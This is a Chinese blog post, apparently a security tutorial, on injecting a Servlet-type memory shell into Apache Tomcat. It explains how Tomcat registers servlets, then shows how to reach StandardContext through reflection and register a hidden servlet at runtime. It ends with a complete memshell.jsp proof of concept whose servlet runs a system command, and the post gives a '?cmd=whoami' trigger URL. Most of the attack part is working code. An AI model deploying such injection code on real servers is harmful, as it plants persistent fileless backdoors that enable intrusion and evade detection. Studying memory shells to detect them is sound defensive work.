+<p>在Tomcat中，Servlet的加载过程分为两个主要阶段：应用启动时的静态配置加载和运行时的动态注册。ContextConfig.configureContext(WebXml webxml)主要负责第一种情况。<br>
+ContextConfig.configureContext(WebXml webxml)的作用<br>
+ContextConfig是Tomcat中负责配置Context容器的类，它会读取web.xml文件并将配置信息应用到StandardContext中。</p>
+</blockquote>
+<h3 id="静态配置加载过程">静态配置加载过程</h3>
+<p>当Tomcat启动Web应用时，会执行以下步骤：</p>
+<ul>
+<li>解析web.xml文件：
+<ul>
+<li>ContextConfig读取并解析web.xml文件</li>
+<li>将配置信息存储在WebXml对象中</li>
+</ul>
+</li>
+<li>调用configureContext方法：
+<ul>
+<li>ContextConfig.configureContext(WebXml webxml)方法会处理WebXml中的配置</li>
+<li>对于Servlet配置，会创建Wrapper并添加到StandardContext<br>
+除了 <code>web.xml</code>，<code>ContextConfig</code> 还会扫描类路径下的 <code>@WebServlet</code>、<code>@WebFilter</code> 等注解（需 <code>metadata-complete=&quot;false&quot;</code>），并将它们合并到 <code>WebXml</code> 对象中，后续处理逻辑完全一致<br>
+上面项目通过web.xml配置加载的：<br>
+当Tomcat启动时，ContextConfig会：</li>
+</ul>
+</li>
+<li>
+<ol>
+<li>解析这段配置</li>
+</ol>
+</li>
+<li>
+<ol start="2">
+<li>在configureContext方法中创建一个名为&quot;ServletDemo&quot;的Wrapper</li>
+</ol>
+</li>
+<li>
+<ol start="3">
+<li>将Wrapper添加到StandardContext的children容器中</li>
+</ol>
+</li>
+<li>
+<ol start="4">
+<li>添加URL映射关系：“/servletdemo” -&gt; “ServletDemo”<br>
+所以在org.apache.catalina.startup.ContextConfig文件configureContext方法打个断点进行分析<br>
+<img src="/images/ob-20251018140059719.png" alt=""><br>
+断点后调试, 分析<br>
+<img src="/images/ob-20251018140324721.png" alt=""><br>
+<code>servlets</code> 是一个 <code>HashMap</code> 类型的变量，用于存储 Web 应用中所有已配置的 Servlet 的相关信息 ，键是 Servlet 的名称，值是 <code>ServletDef</code> 类型的对象<br>
+<code>servletMappings</code> 是一个 <code>HashMap</code> 类型的变量，它维护了 URL 模式和 Servlet 名称之间的映射关系 ，即通过这个数据结构，Tomcat 能够知道当接收到某个 URL 请求时，应该将请求转发给哪个 Servlet 进行处理。<br>
+configureContext中的处理流程<br>
+在configureContext方法中，对于Servlet配置的处理大致如下：</li>
+</ol>
+</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 简化的处理流程</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">configureContext</span><span class="params">(WebXml webxml)</span> &#123;</span><br><span class="line">    <span class="comment">// 处理Servlet定义</span></span><br><span class="line">    <span class="keyword">for</span> (ServletDef servletDef : webxml.getServlets().values()) &#123;</span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">        wrapper.setName(servletDef.getServletName());</span><br><span class="line">        wrapper.setServletClass(servletDef.getServletClass());</span><br><span class="line">        <span class="comment">// 设置其他属性...</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 添加到Context容器</span></span><br><span class="line">        context.addChild(wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 处理Servlet映射</span></span><br><span class="line">    <span class="keyword">for</span> (ServletMappingDef mapping : webxml.getServletMappings()) &#123;</span><br><span class="line">        context.addServletMappingDecoded(</span><br><span class="line">            mapping.getUrlPattern(), </span><br><span class="line">            mapping.getServletName());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 处理其他配置...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在这里核心代码就是<br>
+<img src="/images/ob-20251018141342721.png" alt=""><br>
+这两行, 所以在注入内存马的时候, 只需要调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context.addChild(wrapper);  </span><br><span class="line">context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br></pre></td></tr></table></figure>
+<p>所以需要获取<code>context</code>, 分析调用堆栈, 可知context来自于<code>StandardContext</code><br>
+<code>ContextConfig</code> 是 <code>StandardContext</code> 的生命周期监听器（LifecycleListener）。在 Tomcat 启动时，<code>StandardContext</code> 会将自身作为事件源传递给 <code>ContextConfig</code>，因此 <code>ContextConfig.context</code> 字段实际指向的就是当前 Web 应用的 <code>StandardContext</code> 实例。<br>
+这是正常的静态配置的接在servlet的过程</p>
+<h3 id="动态配置–注入内存马">动态配置–注入内存马</h3>
+<p>基于上面的分析, 我们只需要能够获取StandardContext实列,然后调用addChild()和addServletMappingDecoded()方法就可以注入内存马<br>
+虽然 <code>StandardContext</code> 提供了 <code>addChild()</code> 方法，但问题是：</p>
+<ul>
+<li><code>StandardContext</code> 是 Tomcat 内部实现类，不在标准 API 中暴露。</li>
+<li>我们的恶意代码运行在 Servlet 或 Filter 中，无法直接引用它。<br>
+但我们有一个“合法入口”——每个 HTTP 请求都能访问的：</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br></pre></td></tr></table></figure>
+<p>这个 <code>servletContext</code> 对象看似只是一个标准接口，但实际上它背后隐藏着 <code>StandardContext</code> 的真实实例。我们要做的，就是通过<strong>反射</strong>一层层“剥开”它的包装。</p>
+<ul>
+<li>🧩 1. Tomcat 的包装结构：三层嵌套</li>
+</ul>
+<p>在 Tomcat 中，<code>ServletContext</code> 的实现采用了<strong>门面模式（Facade Pattern）</strong>，目的是对外暴露安全接口，隐藏内部复杂结构。<br>
+其真实结构如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">request.getServletContext()</span><br><span class="line">    ↓</span><br><span class="line">返回类型：ServletContext (接口)</span><br><span class="line">    ↓</span><br><span class="line">实际对象：ApplicationContextFacade ← 我们拿到的“门面”</span><br><span class="line">             ↓</span><br><span class="line">           applicationContext (字段) → ApplicationContext ← 中间包装</span><br><span class="line">                                          ↓</span><br><span class="line">                                        context (字段) → StandardContext ← 真实目标 ✅</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>类名</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ServletContext</code></td>
+<td>Java EE 标准接口，应用层唯一可见的入口</td>
+</tr>
+<tr>
+<td><code>ApplicationContextFacade</code></td>
+<td>门面类，防止用户直接操作内部对象</td>
+</tr>
+<tr>
+<td><code>ApplicationContext</code></td>
+<td>内部包装类，持有对 <code>StandardContext</code> 的引用</td>
+</tr>
+<tr>
+<td><code>StandardContext</code></td>
+<td>Tomcat 核心类，真正管理 Servlet 的生命周期</td>
+</tr>
+<tr>
+<td>基于此, 构造servlet内存马</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h4 id="流程">流程:</h4>
+<ol>
+<li>创建恶意Servlet类</li>
+<li>获取context：StandardContext（通过反射）</li>
+<li>从context获取Wrapper对象</li>
+<li>将自己的Servlet封装进wrapper对象</li>
+<li>将wrapper添加到上下文并设置映射路径</li>
+</ol>
+<h4 id="1-创建恶意Servlet类">1. 创建恶意Servlet类</h4>
+<p><img src="/images/ob-20251018154243202.png" alt=""></p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;&lt;%--  </span><br><span class="line">  Created by IntelliJ IDEA.  User: <span class="number">14109</span>  Date: <span class="number">2025</span>/<span class="number">10</span>/<span class="number">18</span>  Time: <span class="number">15</span>:<span class="number">41</span>  To change <span class="built_in">this</span> template use File | Settings | File Templates.--%&gt;  </span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;  </span><br><span class="line">&lt;%!  </span><br><span class="line">    <span class="comment">// 定义一个恶意servlet  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException, IOException &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="2-获取context：StandardContext（通过反射）">2. 获取context：StandardContext（通过反射）</h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方式1：通过 request（最常用）</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) servletContext;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方式2：通过 Thread Context ClassLoader（无 request 时）</span></span><br><span class="line"><span class="type">WebAppClassLoader</span> <span class="variable">webAppClassLoader</span> <span class="operator">=</span> (WebAppClassLoader) Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webAppClassLoader.getContext();</span><br></pre></td></tr></table></figure>
+<p>✅ <strong>为什么能强转？</strong><br>
+因为 Tomcat 中 <code>StandardContext</code> 实现了 <code>ServletContext</code> 接口。</p>
+<h4 id="3-调用-context-createWrapper-创建一个全新的-Wrapper。"><strong>3. 调用 <code>context.createWrapper()</code> 创建一个全新的 Wrapper</strong>。</h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">wrapper.setName(<span class="string">&quot;evil&quot;</span>); <span class="comment">// Servlet 名称（必须唯一）</span></span><br><span class="line">wrapper.setServlet(evilServlet); <span class="comment">// 直接设置 Servlet 实例（绕过类加载）</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>🔑 关键点：</p>
+<ul>
+<li>不要调用 <code>setServletClass()</code>（那样会走类加载 + init，可能失败）</li>
+<li><strong>直接 <code>setServlet(instance)</code></strong> 才能确保恶意逻辑生效</li>
+</ul>
+</blockquote>
+<hr>
+<h4 id="4-将-Wrapper-添加到-StandardContext">4. <strong>将 Wrapper 添加到 StandardContext</strong></h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">standardContext.addChild(wrapper);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>这会将 wrapper 加入 <code>StandardContext.children</code> 容器</li>
+<li>后续请求分发时，Tomcat 能找到这个 Servlet</li>
+</ul>
+<h4 id="5-注册-URL-映射路径">5. <strong>注册 URL 映射路径</strong></h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">standardContext.addServletMappingDecoded(<span class="string">&quot;/evil&quot;</span>, <span class="string">&quot;evil&quot;</span>);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>第一个参数：访问路径（如 <code>/evil</code>）</li>
+<li>第二个参数：Servlet 名称（必须与 <code>wrapper.setName()</code> 一致）</li>
+</ul>
+<blockquote>
+<p>✅ 此时访问 <code>http://target/evil?cmd=whoami</code> 即可触发内存马。</p>
+</blockquote>
+<h3 id="完整内存马">完整内存马</h3>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.*&quot;</span> %&gt; &lt;!-- 导入反射相关类，用于突破 <span class="keyword">private</span> 限制 --&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.*&quot;</span> %&gt; &lt;!-- 导入 Tomcat 核心类：StandardContext、ApplicationContext 等 --&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt; &lt;!-- Wrapper 是 Tomcat 中包装 Servlet 的容器组件 --&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%--</span><br><span class="line">  文件名: memshell.jsp</span><br><span class="line">  功能: Tomcat Servlet 型内存马注入 PoC</span><br><span class="line">  作者: [你的名字]</span><br><span class="line">  日期: <span class="number">2025</span>年<span class="number">10</span>月<span class="number">18</span>日</span><br><span class="line">  描述: 通过反射获取 StandardContext，动态注册恶意 Servlet，实现无文件 WebShell。</span><br><span class="line">--%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="comment">// ==================== 定义恶意 Servlet（静态内部类）====================</span></span><br><span class="line">    <span class="comment">// 注意：此处 ShellServlet 虽未显式声明为 static，但在实际运行中仍可能被当作 static 处理</span></span><br><span class="line">    <span class="comment">//      但为了安全起见，建议显式添加 static，避免持有外部 JSP 实例引用导致类加载问题</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造函数（可选）</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ShellServlet</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 重写 doGet 方法，处理 HTTP GET 请求</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 执行系统命令：弹出计算器（Windows 系统）</span></span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 其他平台示例：</span></span><br><span class="line">                <span class="comment">// macOS: Runtime.getRuntime().exec(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);</span></span><br><span class="line">                <span class="comment">// Linux: Runtime.getRuntime().exec(&quot;gnome-calculator&quot;);</span></span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="comment">// 异常不会返回给客户端，但会记录在服务器日志中</span></span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 重写 doPost 方法，使其与 doGet 行为一致</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            doGet(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// ==================== 获取 StandardContext 实例 ====================</span></span><br><span class="line">    <span class="comment">// 目标：获取 Tomcat 的 StandardContext 对象，它是管理 Servlet 生命周期的核心组件</span></span><br><span class="line">    <span class="comment">// 路径：ServletContext → ApplicationContextFacade → ApplicationContext → StandardContext</span></span><br><span class="line">    <span class="comment">// 原理：Tomcat 使用门面模式（Facade）保护内部对象，我们通过反射“剥开”这层封装</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从当前请求中获取 ServletContext 对象</span></span><br><span class="line">    <span class="comment">// ServletContext 是整个 Web 应用的全局上下文，每个请求都能访问</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// --- 第一步：从 ServletContext 获取 ApplicationContext ---</span></span><br><span class="line">        <span class="comment">// request.getServletContext() 返回的是 org.apache.catalina.core.ApplicationContextFacade</span></span><br><span class="line">        <span class="comment">// 它是一个门面类，内部通过 private 字段 context 持有真正的 ApplicationContext 实例</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        <span class="comment">// setAccessible(true) 允许访问 private 字段，突破 Java 访问控制</span></span><br><span class="line">        applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 获取 ApplicationContext 实例</span></span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);</span><br><span class="line">        <span class="comment">// 此时我们拿到了 ApplicationContext，它是 ApplicationContextFacade 的内部包装对象</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// --- 第二步：从 ApplicationContext 获取 StandardContext ---</span></span><br><span class="line">        <span class="comment">// ApplicationContext 内部通过 protected 字段 context 持有 StandardContext 的引用</span></span><br><span class="line">        <span class="comment">// StandardContext 是 Tomcat 中对应 &lt;Context&gt; 的实现类，负责管理 Servlet、Filter 等</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 获取 StandardContext 实例</span></span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line">        <span class="comment">// ✅ 成功获取 StandardContext！现在我们可以动态注册 Servlet 了</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================== 创建并配置 Wrapper ====================</span></span><br><span class="line">        <span class="comment">// 在 Tomcat 中，Servlet 不是直接添加到 Context 的，而是通过 Wrapper 包装</span></span><br><span class="line">        <span class="comment">// Wrapper 是 Tomcat 的“管道”组件，用于封装 Servlet 实例及其配置</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个新的 Wrapper 实例</span></span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置 Wrapper 的名称（唯一标识符）</span></span><br><span class="line">        wrapper.setName(<span class="string">&quot;memshell&quot;</span>);</span><br><span class="line">        <span class="comment">// 这个名称将在 addServletMappingDecoded 中使用，必须唯一且一致</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置 Wrapper 要加载的 Servlet 类名</span></span><br><span class="line">        <span class="comment">// 注意：setServletClass() 是告诉容器“按需加载”该类</span></span><br><span class="line">        <span class="comment">// 但因为我们已经 new 了一个实例，所以这个设置不是必须的</span></span><br><span class="line">        wrapper.setServletClass(ShellServlet.class.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 直接设置 Servlet 实例（推荐方式）</span></span><br><span class="line">        <span class="comment">// 这样可以避免类加载器找不到内部类的问题（如 JSP 编译后的 $ShellServlet）</span></span><br><span class="line">        wrapper.setServlet(<span class="keyword">new</span> <span class="title class_">ShellServlet</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================== 注册 Servlet 到容器 ====================</span></span><br><span class="line">        <span class="comment">// 将包装好的 Wrapper 添加到 StandardContext 的子组件列表中</span></span><br><span class="line">        <span class="comment">// 相当于在 web.xml 中定义了：</span></span><br><span class="line">        <span class="comment">// &lt;servlet&gt;</span></span><br><span class="line">        <span class="comment">//     &lt;servlet-name&gt;memshell&lt;/servlet-name&gt;</span></span><br><span class="line">        <span class="comment">//     &lt;servlet-class&gt;ShellServlet&lt;/servlet-class&gt;</span></span><br><span class="line">        <span class="comment">// &lt;/servlet&gt;</span></span><br><span class="line">        standardContext.addChild(wrapper);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将 URL 路径 &quot;/memshell&quot; 映射到名为 &quot;memshell&quot; 的 Servlet</span></span><br><span class="line">        <span class="comment">// addServletMappingDecoded 表示路径已经是解码状态（无需 URL 解码）</span></span><br><span class="line">        <span class="comment">// 相当于在 web.xml 中定义了：</span></span><br><span class="line">        <span class="comment">// &lt;servlet-mapping&gt;</span></span><br><span class="line">        <span class="comment">//     &lt;servlet-name&gt;memshell&lt;/servlet-name&gt;</span></span><br><span class="line">        <span class="comment">//     &lt;url-pattern&gt;/memshell&lt;/url-pattern&gt;</span></span><br><span class="line">        <span class="comment">// &lt;/servlet-mapping&gt;</span></span><br><span class="line">        standardContext.addServletMappingDecoded(<span class="string">&quot;/memshell&quot;</span>, <span class="string">&quot;memshell&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 可选：向客户端返回成功信息</span></span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&lt;h3&gt;✅ Memory Shell Injected!&lt;/h3&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;Access &lt;a href=&#x27;/memshell&#x27;&gt;/memshell&lt;/a&gt; to trigger calc.&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// 捕获所有异常，防止页面崩溃暴露细节</span></span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&lt;h3&gt;❌ Injection Failed: &quot;</span> + e.getMessage() + <span class="string">&quot;&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">        <span class="comment">// 打印堆栈到服务器日志（仅管理员可见）</span></span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="子非鱼 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="子非鱼 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"># 安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/10/19/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BLIstener%E5%86%85%E5%AD%98%E9%A9%AC/" rel="prev" title="Java安全之LIstener内存马">
+                  <i class="fa fa-angle-left"></i> Java安全之LIstener内存马
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/10/23/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BSpring-Controller%E5%86%85%E5%AD%98%E9%A9%AC/" rel="next" title="Java安全之Spring Controller内存马">
+                  Java安全之Spring Controller内存马 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">子非鱼</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
